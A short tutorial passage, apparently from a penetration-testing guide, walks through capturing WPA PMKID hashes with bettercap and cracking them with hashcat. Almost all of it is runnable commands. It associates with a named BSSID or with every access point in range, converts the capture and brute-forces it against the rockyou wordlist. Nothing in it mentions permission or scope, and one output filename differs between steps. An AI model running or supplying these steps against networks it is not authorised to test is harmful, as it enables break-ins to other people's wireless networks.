PMKID capture using bettercap
For this final method, we will use a good old bettercap. This tool requires an older version of the pcap library so, we’ll first download that using wget. 
wget http://old.kali.org/kali/pool/main/libp/libpcap/libpcap0.8_1.9.1-4_amd64.deb
dpkg -i libpcap0.8_1.9.1-4_amd64.deb


Now that it’s installed and our adapter is in monitor mode, we’ll run bettercap
bettercap
set wifi.interface wlan0mon
wifi.recon on
We’ll see all the APs in range  


We’ll display this a little bit more clearly using:
wifi.show


We now need to associate with an access point using the BSSID. 
wifi.assoc 68:14:01:5a:0e:9c
As you can see, PMKID is captured now in /root/bettercap-wifi-handshakes.pcap file.  


Similarly, if you want to capture PMKID of all the Access Points, 
wifi.assoc all


We now need to convert this pcap file in Hashcat format and crack it as we did before, so: 
hcxpcaptool -z hashpmkid bettercap-wifi-handshake.pcap
hashcat -m 16800 --force hashpmkid /usr/share/wordlists/rockyou.txt --show


And that’s how it’s done!
